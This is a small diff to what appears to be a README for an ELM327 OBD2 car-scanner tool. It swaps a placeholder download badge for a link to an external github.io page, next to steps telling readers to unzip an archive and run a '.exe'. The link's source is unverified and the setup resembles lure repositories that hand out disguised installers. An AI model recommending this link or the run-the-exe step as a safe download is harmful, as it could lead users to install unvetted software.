@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application and connect your ELM327 adapter via USB or Bluetooth.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://carscanner-elm-obd2.github.io/.github/)
 
 ## 📸 Overview
 ![car-scanner-elm-dashboard](https://github.com/user-attachments/assets/1fb66400-20cc-4ce2-b3af-7b7a790d2212)
